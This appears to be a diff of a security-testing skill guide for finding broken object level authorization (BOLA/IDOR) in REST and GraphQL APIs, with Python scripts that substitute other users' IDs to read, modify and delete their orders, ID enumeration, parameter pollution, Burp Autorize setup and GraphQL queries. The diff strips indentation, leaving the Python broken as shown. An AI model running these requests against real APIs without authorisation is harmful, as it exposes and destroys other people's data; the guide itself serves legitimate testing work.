@@ -1,13 +1,13 @@
 ---
 name: testing-api-for-broken-object-level-authorization
 description: 'Tests REST and GraphQL APIs for Broken Object Level Authorization (BOLA/IDOR,
-  OWASP API1:2023) by intercepting API calls, identifying object ID parameters (numeric
-  IDs, UUIDs, slugs), and systematically substituting IDs belonging to other users
-  to check whether the server enforces per-object authorization. Use when asked to
-  test BOLA or IDOR in an API, verify object-level authorization, or assess an API
-  for access control bypass.
+ OWASP API1:2023) by intercepting API calls, identifying object ID parameters (numeric
+ IDs, UUIDs, slugs), and systematically substituting IDs belonging to other users
+ to check whether the server enforces per-object authorization. Use when asked to
+ test BOLA or IDOR in an API, verify object-level authorization, or assess an API
+ for access control bypass.
 
-  '
+ '
 domain: cybersecurity
 subdomain: api-security
 tags:
@@ -67,15 +67,15 @@ curl -s https://target-api.example.com/api/docs/swagger.json | python3 -m json.t
 
 # Extract all endpoints with path parameters
 curl -s https://target-api.example.com/api/docs/swagger.json | \
-  python3 -c "
+ python3 -c "
 import json, sys
 spec = json.load(sys.stdin)
 for path, methods in spec.get('paths', {}).items():
-    for method, details in methods.items():
-        if method in ('get','post','put','patch','delete'):
-            params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
-            if params:
-                print(f'{method.upper()} {path} -> params: {params}')
+ for method, details in methods.items():
+ if method in ('get','post','put','patch','delete'):
+ params = [p['name'] for p in details.get('parameters',[]) if p.get('in') in ('path','query')]
+ if params:
+ print(f'{method.upper()} {path} -> params: {params}')
 "
 ```
 
@@ -114,17 +114,17 @@ user_b_headers = {"Authorization": user_b_token, "Content-Type": "application/js
 
 # Step 1: Identify User A's objects
 user_a_profile = requests.get(f"{BASE_URL}/users/me", headers=user_a_headers)
-user_a_id = user_a_profile.json()["id"]  # e.g., 1001
+user_a_id = user_a_profile.json()["id"] # e.g., 1001
 
 user_a_orders = requests.get(f"{BASE_URL}/users/{user_a_id}/orders", headers=user_a_headers)
-user_a_order_ids = [o["id"] for o in user_a_orders.json()["orders"]]  # e.g., [5001, 5002]
+user_a_order_ids = [o["id"] for o in user_a_orders.json()["orders"]] # e.g., [5001, 5002]
 
 # Step 2: Identify User B's objects
 user_b_profile = requests.get(f"{BASE_URL}/users/me", headers=user_b_headers)
-user_b_id = user_b_profile.json()["id"]  # e.g., 1002
+user_b_id = user_b_profile.json()["id"] # e.g., 1002
 
 user_b_orders = requests.get(f"{BASE_URL}/users/{user_b_id}/orders", headers=user_b_headers)
-user_b_order_ids = [o["id"] for o in user_b_orders.json()["orders"]]  # e.g., [5003, 5004]
+user_b_order_ids = [o["id"] for o in user_b_orders.json()["orders"]] # e.g., [5003, 5004]
 
 print(f"User A (ID: {user_a_id}): Orders {user_a_order_ids}")
 print(f"User B (ID: {user_b_id}): Orders {user_b_order_ids}")
@@ -142,53 +142,53 @@ results = []
 # Test 1: Access User B's profile with User A's token
 resp = requests.get(f"{BASE_URL}/users/{user_b_id}", headers=user_a_headers)
 results.append({
-    "test": "Access other user profile",
-    "endpoint": f"GET /users/{user_b_id}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code == 200,
-    "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
+ "test": "Access other user profile",
+ "endpoint": f"GET /users/{user_b_id}",
+ "auth": "User A",
+ "status": resp.status_code,
+ "vulnerable": resp.status_code == 200,
+ "data_leaked": list(resp.json().keys()) if resp.status_code == 200 else None
 })
 
 # Test 2: Access User B's orders with User A's token
 for order_id in user_b_order_ids:
-    resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
-    results.append({
-        "test": f"Access other user order {order_id}",
-        "endpoint": f"GET /orders/{order_id}",
-        "auth": "User A",
-        "status": resp.status_code,
-        "vulnerable": resp.status_code == 200
-    })
+ resp = requests.get(f"{BASE_URL}/orders/{order_id}", headers=user_a_headers)
+ results.append({
+ "test": f"Access other user order {order_id}",
+ "endpoint": f"GET /orders/{order_id}",
+ "auth": "User A",
+ "status": resp.status_code,
+ "vulnerable": resp.status_code == 200
+ })
 
 # Test 3: Modify User B's order with User A's token
 resp = requests.patch(
-    f"{BASE_URL}/orders/{user_b_order_ids[0]}",
-    headers=user_a_headers,
-    json={"status": "cancelled"}
+ f"{BASE_URL}/orders/{user_b_order_ids[0]}",
+ headers=user_a_headers,
+ json={"status": "cancelled"}
 )
 results.append({
-    "test": "Modify other user order",
-    "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code in (200, 204)
+ "test": "Modify other user order",
+ "endpoint": f"PATCH /orders/{user_b_order_ids[0]}",
+ "auth": "User A",
+ "status": resp.status_code,
+ "vulnerable": resp.status_code in (200, 204)
 })
 
 # Test 4: Delete User B's resource with User A's token
 resp = requests.delete(f"{BASE_URL}/orders/{user_b_order_ids[0]}", headers=user_a_headers)
 results.append({
-    "test": "Delete other user order",
-    "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
-    "auth": "User A",
-    "status": resp.status_code,
-    "vulnerable": resp.status_code in (200, 204)
+ "test": "Delete other user order",
+ "endpoint": f"DELETE /orders/{user_b_order_ids[0]}",
+ "auth": "User A",
+ "status": resp.status_code,
+ "vulnerable": resp.status_code in (200, 204)
 })
 
 # Print results
 for r in results:
-    status = "VULNERABLE" if r["vulnerable"] else "SECURE"
-    print(f"[{status}] {r['test']}: {r['endpoint']} -> HTTP {r['status']}")
+ status = "VULNERABLE" if r["vulnerable"] else "SECURE"
+ print(f"[{status}] {r['test']}: {r['endpoint']} -> HTTP {r['status']}")
 ```
 
 ### Step 4: Advanced BOLA Techniques
@@ -198,54 +198,54 @@ Test for less obvious BOLA patterns:
 ```python
 # Technique 1: Parameter pollution - send both IDs
 resp = requests.get(
-    f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
-    headers=user_a_headers
+ f"{BASE_URL}/orders/{user_a_order_ids[0]}?order_id={user_b_order_ids[0]}",
+ headers=user_a_headers
 )
 print(f"Parameter pollution: {resp.status_code}")
 
 # Technique 2: JSON body object ID override
 resp = requests.post(
-    f"{BASE_URL}/orders/details",
-    headers=user_a_headers,
-    json={"order_id": user_b_order_ids[0]}
+ f"{BASE_URL}/orders/details",
+ headers=user_a_headers,
+ json={"order_id": user_b_order_ids[0]}
 )
 print(f"Body ID override: {resp.status_code}")
 
 # Technique 3: Array of IDs - include other user's IDs in batch request
 resp = requests.post(
-    f"{BASE_URL}/orders/batch",
-    headers=user_a_headers,
-    json={"order_ids": user_a_order_ids + user_b_order_ids}
+ f"{BASE_URL}/orders/batch",
+ headers=user_a_headers,
+ json={"order_ids": user_a_order_ids + user_b_order_ids}
 )
 print(f"Batch ID inclusion: {resp.status_code}, returned {len(resp.json().get('orders',[]))} orders")
 
 # Technique 4: Numeric ID manipulation for sequential IDs
 for offset in range(-5, 6):
-    test_id = user_a_order_ids[0] + offset
-    if test_id not in user_a_order_ids:
-        resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
-        if resp.status_code == 200:
-            owner = resp.json().get("user_id", "unknown")
-            if str(owner) != str(user_a_id):
-                print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")
+ test_id = user_a_order_ids[0] + offset
+ if test_id not in user_a_order_ids:
+ resp = requests.get(f"{BASE_URL}/orders/{test_id}", headers=user_a_headers)
+ if resp.status_code == 200:
+ owner = resp.json().get("user_id", "unknown")
+ if str(owner) != str(user_a_id):
+ print(f"BOLA: Order {test_id} belongs to user {owner}, accessible by User A")
 
 # Technique 5: Swap object ID in nested resource paths
 resp = requests.get(
-    f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
-    headers=user_a_headers
+ f"{BASE_URL}/users/{user_b_id}/orders/{user_b_order_ids[0]}/invoice",
+ headers=user_a_headers
 )
 print(f"Nested resource BOLA: {resp.status_code}")
 
 # Technique 6: Method switching - GET may be blocked but PUT allowed
 for method in ['GET', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']:
-    resp = requests.request(
-        method,
-        f"{BASE_URL}/users/{user_b_id}/settings",
-        headers=user_a_headers,
-        json={"notifications": False} if method in ('PUT', 'PATCH') else None
-    )
-    if resp.status_code not in (401, 403, 405):
-        print(f"Method {method} on other user settings: {resp.status_code}")
+ resp = requests.request(
+ method,
+ f"{BASE_URL}/users/{user_b_id}/settings",
+ headers=user_a_headers,
+ json={"notifications": False} if method in ('PUT', 'PATCH') else None
+ )
+ if resp.status_code not in (401, 403, 405):
+ print(f"Method {method} on other user settings: {resp.status_code}")
 ```
 
 ### Step 5: Automated BOLA Detection with Autorize (Burp Suite)
@@ -255,17 +255,17 @@ Configure Autorize for automated detection:
 1. Install Autorize from the BApp Store in Burp Suite Professional
 2. In the Autorize tab, paste User B's authentication cookie or header
 3. Configure the interception filters:
-   - Include: `.*\/api\/.*` (only API paths)
-   - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
+ - Include: `.*\/api\/.*` (only API paths)
+ - Exclude: `.*\.(js|css|png|jpg)$` (skip static assets)
 4. Set the enforcement detector:
-   - Add conditions where response length or status code differs between User A and User B
-   - Mark as "enforced" if User A gets 403/401 for User B's resources
-   - Mark as "bypassed" if User A gets 200 with User B's data
+ - Add conditions where response length or status code differs between User A and User B
+ - Mark as "enforced" if User A gets 403/401 for User B's resources
+ - Mark as "bypassed" if User A gets 200 with User B's data
 5. Browse the application as User A; Autorize automatically replays each request with User B's token
 6. Review the Autorize results table:
-   - Green = Authorization enforced (secure)
-   - Red = Authorization bypassed (BOLA vulnerability)
-   - Orange = Needs manual review (ambiguous response)
+ - Green = Authorization enforced (secure)
+ - Red = Authorization bypassed (BOLA vulnerability)
+ - Orange = Needs manual review (ambiguous response)
 
 ### Step 6: GraphQL BOLA Testing
 
@@ -273,39 +273,39 @@ Configure Autorize for automated detection:
 # Test BOLA in GraphQL queries using node/ID relay pattern
 # User A queries User B's order by global relay ID
 query {
-  node(id: "T3JkZXI6NTAwMw==") {  # Base64 of "Order:5003" (User B's)
-    ... on Order {
-      id
-      totalAmount
-      shippingAddress {
-        street
-        city
-      }
-      items {
-        productName
-        quantity
-      }
-    }
-  }
+ node(id: "T3JkZXI6NTAwMw==") { # Base64 of "Order:5003" (User B's)
+ ... on Order {
+ id
+ totalAmount
+ shippingAddress {
+ street
+ city
+ }
+ items {
+ productName
+ quantity
+ }
+ }
+ }
 }
 
 # Test nested object access through relationships
 query {
-  user(id: "1002") {  # User B's ID
-    email
-    phoneNumber
-    orders {
-      edges {
-        node {
-          id
-          totalAmount
-          paymentMethod {
-            lastFourDigits
-          }
-        }
-      }
-    }
-  }
+ user(id: "1002") { # User B's ID
+ email
+ phoneNumber
+ orders {
+ edges {
+ node {
+ id
+ totalAmount
+ paymentMethod {
+ lastFourDigits
+ }
+ }
+ }
+ }
+ }
 }
 ```
 
@@ -360,10 +360,10 @@ query {
 **Severity**: High (CVSS 7.5)
 **OWASP API**: API1:2023 - Broken Object Level Authorization
 **Affected Endpoints**:
-  - GET /api/v1/orders/{id}
-  - PATCH /api/v1/addresses/{id}
-  - GET /api/v1/users/{id}/payment-methods
-  - POST /api/v1/orders/export
+ - GET /api/v1/orders/{id}
+ - PATCH /api/v1/addresses/{id}
+ - GET /api/v1/users/{id}/payment-methods
+ - POST /api/v1/orders/export
 
 **Description**:
 The API does not enforce object-level authorization on order retrieval,
